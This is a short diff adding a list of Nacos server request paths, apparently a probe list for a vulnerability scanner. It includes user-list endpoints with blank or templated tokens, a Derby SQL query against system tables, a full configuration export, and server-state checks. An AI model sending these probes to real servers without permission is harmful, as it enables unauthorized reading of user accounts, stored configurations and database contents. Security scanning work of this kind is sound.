@@ -1,0 +1,8 @@
+/nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token}}
+/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token}}
+/nacos/v1/auth/users?pageNo=1&pageSize=9
+/v1/auth/users?pageNo=1&pageSize=9
+/nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st
+/v1/cs/configs?export=true&group=&tenant=&appName=&ids=&dataId=
+/v1/console/server/state?accessToken=&username=
+/nacos/v1/console/server/state?accessToken=&username=
